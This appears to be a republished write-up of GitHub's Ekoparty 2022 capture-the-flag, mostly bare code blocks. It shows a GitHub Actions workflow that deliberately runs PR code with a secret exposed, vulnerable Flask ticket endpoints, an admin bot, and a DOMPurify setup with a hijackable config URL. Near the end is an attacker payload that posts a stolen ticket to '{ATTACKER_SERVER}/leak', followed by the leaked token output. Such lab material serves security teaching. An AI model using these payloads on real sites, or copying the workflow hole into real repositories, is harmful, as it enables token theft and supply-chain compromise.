# GitHub and the Ekoparty 2022 Capture the Flag

> 原文: https://www.ctfiot.com/89234.html
> ID: 89234


```
import binascii

import math

YourFirst = "lesson"
t = int.from_bytes(YourFirst.encode(), byteorder='little')

for i in range(0,29):
 m = t % 23
 t*=m if m>2 else 2

for i in range(0,1024):
 m = i % 27
 t-= pow(m,m) if m>0 else m*m

for i in range(0,32062):
 m = i % 23
 t-= pow(m,25) if m>0 else m*m

for i in range(0,43052):
 m = i % 19
 t+= pow(m,24) if m>0 else m*m

for i in range(0,36582):
 m = i % 13
 t+= pow(m,24) if m>0 else m*m

for i in range(0,813):
 m = i % 11
 t-= pow(m,24) if m>0 else m*m

for i in range(0,554772):
 m = i % 7
 t-= pow(m,24) if m>0 else m*m

for i in range(0,789):
 m = i % 5
 t+= pow(m,24) if m>0 else m*m

for i in range(0,3753):
 m = i % 4
 t+= pow(m,24) if m>0 else m*m

for i in range(0,5711):
 m = i % 3
 t-= pow(m,24) if m>0 else m*m

for i in range(0,101234):
 t-= 128

t += 328

p = 3562927236051182334153575355087347127407987755959461320351305838619130268209476696833779953363710389416751

print(f'To access the course:\n "https://" + DECODE({hex(p)[2:]}) + "/{hex(t)[2:]}"')
```



```
name: Grade the Pull Request
on:
 workflow_run:
 workflows: ["PR Management"]
 types:
 - completed
 pull_request_target:
 branches:
 - main
jobs:
 build:
 runs-on: ubuntu-latest
 environment: CTF
 steps:
 - name: Checkout head branch of PR
 uses: actions/checkout@v3
 with:
 ref: ${{ github.event.pull_request.head.ref }}
 repository: ${{ github.event.pull_request.head.repo.full_name }}
 - name: Checkout main branch of this repo
 uses: actions/checkout@v3
 with:
 ref: main
 path: ./grading
 - uses: ruby/setup-ruby@v1
 with:
 ruby-version: 3.0.0
 - name: Grade the Pull Request
 run: |
 gem install octokit
 ruby grading/script/grading.rb
 env:
 FLAG: ${{ secrets.FLAG }}
```



```
name: PR Management

on:
 pull_request_target:
 types: [opened]
 branches-ignore: 
 - 'main'

jobs:
 close_pr:
 runs-on: ubuntu-latest
 steps:
 - uses: superbrothers/close-pull-request@v3
 with:
 comment: "Pull Requests are only accepted against the `main` branch."
 cleanup_branch:
 runs-on: ubuntu-latest
 name: Delete non-grading branches
 steps:
 - name: Delete those pesky dead branches
 uses: phpdocker-io/github-actions-delete-abandoned-branches@v1
 id: delete_branches
 with:
 github_token: ${{ github.token }}
 last_commit_age_days: -1
 ignore_branches: main,grading
 dry_run: no
```



```
ticket = Ticket(
 id=uuid4().hex,
 from_id=2,
 content=f"<h4>Hi team!\nI'm having some issues with the authentication API, can you check if this PAT works for you?\nThanks in advance!\nPAT: {os.environ.get('FINAL_EXAM_PAT', 'A cool PAT')}</h4>"
)
```



```
@app.route("/api/ticket/<ticket_id>", methods=["GET"])
@login_required
def api_profile(ticket_id):
 ticket = Ticket.query.filter_by(id=ticket_id).first()

 if ticket:
 if ticket.from_id == g.user.id or g.user.id == 1:
 return jsonify(content=ticket.content)
 else:
 jsonify(error="You are not allowed to see this ticket")
```



```
@app.route("/api/ticket/<ticket_id>/report", methods=["GET"])
@login_required
def api_ticket_report(ticket_id):
 ticket = Ticket.query.filter_by(id=ticket_id).first()
 if ticket:
 if ticket.from_id == g.user.id:
 cli.set(request.remote_addr, ticket_id)
 return jsonify(success="An agent will review your report soon")
 else:
 return jsonify(error="You are not allowed to see this ticket")
```



```
driver.get("/signin")

WebDriverWait(driver, 10).until(
 ec.element_to_be_clickable((By.ID, "usernameInput")))
driver.find_element("id", "usernameInput").send_keys(
 os.environ.get("ADMIN_BOT_USER"))
driver.find_element("id", "passwordInput").send_keys(
 os.environ.get("ADMIN_BOT_PASSWORD"))
driver.find_element("id", "submitButton").click()
driver.get("/ticket/{ticket_id}")

sleep(os.environ.get("BROWSER_SLEEP"))
```



```
<!-- TODO: Improve ticket rendering and add button to report to an agent -->
<div id="about"></div>
<div id="ticket"></div>

<script>
 const getDOMPurifyConfig = async (url) => {
 const response = await getJSONfromURL(url)
 return response.configuration
 }
 const sanitize = async (unsafe_html) => {
 const configuration = await getDOMPurifyConfig(window.DOMPurifyConfigURL || "/api/dompurify_config")
 return DOMPurify.sanitize(unsafe_html, configuration)
 }

 const main = async () => {
 // get about from user
 const user = await getJSONfromURL('/api/profile/{{ user.id }}')
 document.getElementById("about").innerHTML = await sanitize(user.about)

 // get ticket contents
 const ticket = await getJSONfromURL('/api/ticket/{{ ticket_id }}')
 document.getElementById("ticket").innerHTML = await sanitize(ticket.content)
 }

 main()
</script>
```



```
# Note to researchers, default configuration is enough to prevent XSS attacks
@app.route("/api/dompurify_config", methods=["GET"])
def dompurify_config():
 return jsonify(configuration={})
```



```
{% if tickets %}
<div class="list-group">
 {% for ticket in tickets -%}
 <a id="ticket" href="/ticket/{{ ticket.id }}" class="list-group-item list-group-item-action">{{ticket.id }}</a>
 {% endfor %}
</div>
{% endif %}
```



```
r = await fetch('/profile/2');
text = await r.text();

const parser = new DOMParser();
const doc = parser.parseFromString(text, 'text/html');
const ticket_id = doc.getElementById("ticket").href.split("/")[4];
```



```
r = await fetch('/api/ticket/' + ticket_id);
json = await r.json();

await fetch('{ATTACKER_SERVER}/leak?foo=' + encodeURIComponent(JSON.stringify(json)));
```



```
ImmutableMultiDict([('foo', '{"content":"<h4>Hi team!\\nI\'m having some issues with the authentication API, can you check if this PAT works for you?\\nThanks in advance!\\nPAT: <PAT_HERE></h4>"}')])
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/img_63b4137ccbe58.png)